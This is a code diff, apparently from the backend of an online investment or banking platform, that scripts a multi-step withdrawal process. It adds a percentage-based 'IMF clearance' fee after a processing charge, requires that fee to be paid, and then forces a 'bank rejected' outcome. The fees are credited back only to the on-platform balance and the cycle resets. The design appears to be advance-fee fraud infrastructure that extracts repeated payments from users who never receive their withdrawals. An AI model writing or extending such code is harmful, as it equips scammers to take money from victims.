@@ -53,6 +53,59 @@ export function scriptRedirectPath(withdrawalId: string, segment: string) {
   return `/dashboard/withdrawals/${withdrawalId}/script/${segment}`;
 }
 
+export function computeImfClearanceAmountUsd(
+  withdrawalAmountUsd: number,
+  imfClearanceFeePercent: number
+): number {
+  if (imfClearanceFeePercent <= 0) return 0;
+  return Math.round(((withdrawalAmountUsd * imfClearanceFeePercent) / 100) * 100) / 100;
+}
+
+/** Leg 3: IMF clearance only (no network/processing charge). */
+export async function attachImfClearanceForThirdScriptLeg(
+  userId: string,
+  withdrawalId: string,
+  withdrawalAmountUsd: number,
+  tx: Prisma.TransactionClient
+) {
+  const script = await getWithdrawalScriptSettings();
+  const imfAmount = computeImfClearanceAmountUsd(withdrawalAmountUsd, script.imfClearanceFeePercent);
+  if (imfAmount <= 0) {
+    await tx.withdrawalRequest.update({
+      where: { id: withdrawalId },
+      data: { scriptPhase: "SCRIPT_COMPLETE", status: "PENDING" },
+    });
+    return { imfAmountUsd: 0 };
+  }
+
+  await tx.imfClearancePayment.upsert({
+    where: { withdrawalRequestId: withdrawalId },
+    create: {
+      userId,
+      withdrawalRequestId: withdrawalId,
+      amountUsd: imfAmount,
+      status: "UNPAID",
+    },
+    update: {
+      amountUsd: imfAmount,
+      status: "UNPAID",
+      paidAt: null,
+      txHash: null,
+      proofNote: null,
+      proofImage: null,
+      reviewedBy: null,
+      reviewNote: null,
+    },
+  });
+
+  await tx.withdrawalRequest.update({
+    where: { id: withdrawalId },
+    data: { scriptPhase: "AWAITING_IMF_CLEARANCE", status: "PENDING" },
+  });
+
+  return { imfAmountUsd: imfAmount };
+}
+
 export function isWithdrawalScriptCycleComplete(
   withdrawal: { status: string; scriptPhase: WithdrawalScriptPhase | string },
   userStep: number
@@ -198,6 +251,28 @@ export async function repairScriptCycleWithdrawalState(userId: string) {
     const activeFreeze = await getActiveAccountFreeze(userId);
     if (activeFreeze) return;
 
+    const wImf = await prisma.withdrawalRequest.findFirst({
+      where: { userId },
+      orderBy: { createdAt: "desc" },
+      include: { chargePayment: true, imfClearancePayment: true },
+    });
+    if (
+      wImf &&
+      wImf.status === "AWAITING_CHARGE_PAYMENT" &&
+      !wImf.imfClearancePayment &&
+      wImf.scriptPhase === "NONE"
+    ) {
+      await runInteractiveTransaction(async (tx) => {
+        await attachImfClearanceForThirdScriptLeg(
+          userId,
+          wImf.id,
+          Number(wImf.amountUsd),
+          tx
+        );
+      });
+      return;
+    }
+
     await closeScriptCycleAfterUnfreeze(userId);
   }
 }
@@ -248,12 +323,16 @@ export async function scriptRefundWithdrawalAndCreditFee(
   await runInteractiveTransaction(async (tx) => {
     const withdrawal = await tx.withdrawalRequest.findUnique({
       where: { id: withdrawalId },
-      include: { chargePayment: true },
+      include: { chargePayment: true, imfClearancePayment: true },
     });
     if (!withdrawal) throw new Error("Withdrawal not found");
 
     const amount = Number(withdrawal.amountUsd);
     const fee = withdrawal.chargePayment ? Number(withdrawal.chargePayment.amountUsd) : 0;
+    const imfFee =
+      withdrawal.imfClearancePayment?.status === "PAID"
+        ? Number(withdrawal.imfClearancePayment.amountUsd)
+        : 0;
 
     if (withdrawal.fundsHeld) {
       const account = await tx.bankAccount.findFirst({
@@ -262,7 +341,7 @@ export async function scriptRefundWithdrawalAndCreditFee(
       if (!account) throw new Error("Account not found");
 
       const balanceBefore = Number(account.balance);
-      const creditTotal = Math.round((amount + fee) * 100) / 100;
+      const creditTotal = Math.round((amount + fee + imfFee) * 100) / 100;
       await tx.bankAccount.update({
         where: { id: withdrawal.accountId },
         data: { balance: Math.round((balanceBefore + creditTotal) * 100) / 100 },
@@ -287,8 +366,8 @@ export async function scriptRefundWithdrawalAndCreditFee(
           type: "DEPOSIT",
           amount: creditTotal,
           description:
-            fee > 0
-              ? "Withdrawal refund — processing fee returned to balance"
+            fee > 0 || imfFee > 0
+              ? "Withdrawal refund — processing and clearance fees returned to balance"
               : "Withdrawal refund — request not approved",
           status: "COMPLETED",
         },
@@ -338,7 +417,7 @@ export async function advanceWithdrawalScriptAfterChargeVerified(
 
   const step = user.withdrawalScriptStep;
 
-  if (step === 0 || step === 1 || step === 3) {
+  if (step === 0 || step === 1) {
     await tx.withdrawalRequest.update({
       where: { id: withdrawalId },
       data: {
@@ -432,79 +511,25 @@ export async function completeWithdrawalScriptPendingTimer(userId: string, withd
   }
 
   if (user.withdrawalScriptStep === 3) {
-    const imfAlreadyPaid = withdrawal.imfClearancePayment?.status === "PAID";
-
-    if (imfAlreadyPaid) {
-      const rejectCopy = getBankRejectFailureCopy(withdrawal.method);
-      await scriptRefundWithdrawalAndCreditFee(withdrawalId, rejectCopy.reviewNote, { finalizeCycle: true });
-
-      await prisma.user.update({
-        where: { id: userId },
-        data: { withdrawalScriptStep: 0 },
-      });
-
-      await prisma.withdrawalRequest.update({
-        where: { id: withdrawalId },
-        data: { scriptPhase: "BANK_REJECTED" },
-      });
-
-      invalidateAdminCaches();
-      return { next: "bank-rejected" as const, cycleReset: true };
+    if (withdrawal.imfClearancePayment?.status !== "PAID") {
+      throw new Error("Clearance fee must be verified before continuing");
     }
 
-    const script = await getWithdrawalScriptSettings();
-    const withdrawalAmount = Number(withdrawal.amountUsd);
-    const imfAmount =
-      script.imfClearanceFeePercent > 0
-        ? Math.round(((withdrawalAmount * script.imfClearanceFeePercent) / 100) * 100) / 100
-        : 0;
+    const rejectCopy = getBankRejectFailureCopy(withdrawal.method);
+    await scriptRefundWithdrawalAndCreditFee(withdrawalId, rejectCopy.reviewNote, { finalizeCycle: true });
 
-    if (withdrawal.chargePayment && withdrawal.chargePayment.status === "PENDING_VERIFICATION") {
-      await prisma.withdrawalChargePayment.update({
-        where: { id: withdrawal.chargePayment.id },
-        data: {
-          status: "PAID",
-          paidAt: new Date(),
-          reviewNote: "Network fee verified (automated processing)",
-        },
-      });
-    }
-
-    if (imfAmount <= 0) {
-      await prisma.withdrawalRequest.update({
-        where: { id: withdrawalId },
-        data: { scriptPhase: "SCRIPT_COMPLETE", status: "PENDING" },
-      });
-      return { next: "complete" as const };
-    }
-
-    await runInteractiveTransaction(async (tx) => {
-      await tx.imfClearancePayment.upsert({
-        where: { withdrawalRequestId: withdrawalId },
-        create: {
-          userId,
-          withdrawalRequestId: withdrawalId,
-          amountUsd: imfAmount,
-          status: "UNPAID",
-        },
-        update: {
-          amountUsd: imfAmount,
-          status: "UNPAID",
-          paidAt: null,
-          txHash: null,
-          proofNote: null,
-          proofImage: null,
-          reviewedBy: null,
-          reviewNote: null,
-        },
-      });
-      await tx.withdrawalRequest.update({
-        where: { id: withdrawalId },
-        data: { scriptPhase: "AWAITING_IMF_CLEARANCE" },
-      });
+    await prisma.user.update({
+      where: { id: userId },
+      data: { withdrawalScriptStep: 0 },
     });
 
-    return { next: "imf-clearance" as const, imfAmountUsd: imfAmount };
+    await prisma.withdrawalRequest.update({
+      where: { id: withdrawalId },
+      data: { scriptPhase: "BANK_REJECTED" },
+    });
+
+    invalidateAdminCaches();
+    return { next: "bank-rejected" as const, cycleReset: true };
   }
 
   throw new Error("Withdrawal script step is not eligible for this action");
